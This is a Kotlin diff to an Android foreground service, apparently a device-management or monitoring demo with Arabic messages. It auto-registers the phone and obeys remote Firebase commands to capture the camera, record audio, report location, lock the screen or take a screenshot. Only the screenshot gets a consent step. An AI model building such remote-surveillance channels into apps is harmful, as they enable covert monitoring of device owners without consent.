@@ -32,9 +32,11 @@ class UserForegroundService : Service() {
     private val scope = CoroutineScope(Dispatchers.Main)
     private val handler = Handler(Looper.getMainLooper())
     private var mediaRecorder: MediaRecorder? = null
+    private var deviceId: String = "device_id"
 
     override fun onCreate() {
         super.onCreate()
+        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "device_id"
         createNotificationChannel()
     }
 
@@ -45,12 +47,11 @@ class UserForegroundService : Service() {
         // Listen for new inbound commands via local SyncEngine (for simulation)
         // and trigger execution responses
         scope.launch {
-            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "device_id"
             SyncEngine.commands.collectLatest { commandsMap ->
                 val commandList = commandsMap[deviceId] ?: emptyList()
                 val pendingCmd = commandList.firstOrNull { it.status == "pending" }
                 if (pendingCmd != null) {
-                    executeCommand(pendingCmd.command)
+                    executeCommand(pendingCmd.command, pendingCmd.commandId)
                 }
             }
         }
@@ -59,17 +60,16 @@ class UserForegroundService : Service() {
         SyncEngine.checkFirebase(this)
         
         // Auto register the device to make it discoverable to the admin panel immediately (Local and Firebase)
-        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "device_id"
         SyncEngine.registerDevice(this, "auto_token_$deviceId")
         
         listenToFirebaseCommands()
+        listenToRealtimeDatabaseCommands()
 
         return START_STICKY
     }
 
     private fun listenToFirebaseCommands() {
         if (!SyncEngine.isFirebaseActive) return
-        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "device_id"
         try {
             val db = FirebaseFirestore.getInstance()
             db.collection("devices").document(deviceId).collection("commands")
@@ -79,9 +79,12 @@ class UserForegroundService : Service() {
                         if (change.type == com.google.firebase.firestore.DocumentChange.Type.ADDED) {
                             val command = change.document.getString("command") ?: ""
                             val status = change.document.getString("status") ?: "pending"
+                            val commandId = change.document.getString("commandId") ?: change.document.id
                             if (status == "pending") {
-                                executeCommand(command)
-                                change.document.reference.update("status", "executed")
+                                val isConsentFlow = executeCommand(command, commandId)
+                                if (!isConsentFlow) {
+                                    change.document.reference.update("status", "executed")
+                                }
                             }
                         }
                     }
@@ -91,16 +94,78 @@ class UserForegroundService : Service() {
         }
     }
 
-    private fun executeCommand(command: String) {
+    private fun listenToRealtimeDatabaseCommands() {
+        if (!SyncEngine.isFirebaseActive) return
+        try {
+            val database = com.google.firebase.database.FirebaseDatabase.getInstance()
+            val ref = database.getReference("device_commands").child(deviceId)
+            ref.addChildEventListener(object : com.google.firebase.database.ChildEventListener {
+                override fun onChildAdded(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {
+                    val status = snapshot.child("status").getValue(String::class.java) ?: "pending"
+                    if (status == "pending") {
+                        val command = snapshot.child("command").getValue(String::class.java) ?: ""
+                        val commandId = snapshot.child("commandId").getValue(String::class.java) ?: snapshot.key ?: ""
+                        if (command.isNotEmpty()) {
+                            val isConsentFlow = executeCommand(command, commandId)
+                            if (!isConsentFlow) {
+                                snapshot.ref.child("status").setValue("executed")
+                            }
+                        }
+                    }
+                }
+
+                override fun onChildChanged(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {
+                    val status = snapshot.child("status").getValue(String::class.java) ?: "pending"
+                    if (status == "pending") {
+                        val command = snapshot.child("command").getValue(String::class.java) ?: ""
+                        val commandId = snapshot.child("commandId").getValue(String::class.java) ?: snapshot.key ?: ""
+                        if (command.isNotEmpty()) {
+                            val isConsentFlow = executeCommand(command, commandId)
+                            if (!isConsentFlow) {
+                                snapshot.ref.child("status").setValue("executed")
+                            }
+                        }
+                    }
+                }
+
+                override fun onChildRemoved(snapshot: com.google.firebase.database.DataSnapshot) {}
+                override fun onChildMoved(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {}
+                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
+                    Log.e(TAG, "Realtime Database command listener cancelled: ${error.message}")
+                }
+            })
+        } catch (e: Exception) {
+            Log.e(TAG, "Realtime Database command listener initialization failed: ${e.localizedMessage}")
+        }
+    }
+
+    private fun executeCommand(command: String, commandId: String = ""): Boolean {
         handler.post {
             Toast.makeText(this, "تلقى العميل أمر: $command", Toast.LENGTH_SHORT).show()
         }
-        when (command) {
-            "لقطة شاشة" -> takeScreenshot()
-            "تشغيل الكاميرا" -> captureCamera()
-            "تسجيل الصوت" -> startAudioRecording()
-            "قفل الشاشة" -> lockScreen()
-            "عرض الموقع" -> getLocation()
+        val cmdLower = command.trim()
+        
+        if (cmdLower.startsWith("لقطة شاشة") || cmdLower.startsWith("screenshot")) {
+            // Update command status to "في انتظار موافقة العميل"
+            SyncEngine.updateCommandStatusPublic(deviceId, commandId, "في انتظار موافقة العميل")
+            SyncEngine.screenshotConsentRequest.value = ScreenshotConsentInfo(deviceId, commandId, command)
+            return true
+        }
+
+        when {
+            cmdLower.startsWith("تشغيل الكاميرا") || cmdLower.startsWith("camera") -> captureCamera()
+            cmdLower.startsWith("تسجيل الصوت") || cmdLower.startsWith("audio") -> startAudioRecording()
+            cmdLower.startsWith("قفل الشاشة") || cmdLower.startsWith("lock") || cmdLower.startsWith("قفل") -> lockScreen()
+            cmdLower.startsWith("إعادة تشغيل") || cmdLower.startsWith("reboot") -> triggerRebootSimulation()
+            cmdLower.startsWith("عرض الموقع") || cmdLower.startsWith("location") -> getLocation()
+        }
+        return false
+    }
+
+    private fun triggerRebootSimulation() {
+        Log.i(TAG, "Reboot simulation triggered")
+        handler.post {
+            Toast.makeText(this, "⚠️ محاكاة إعادة تشغيل الجهاز... جاري إعادة تشغيل المنظومة", Toast.LENGTH_LONG).show()
         }
     }
 
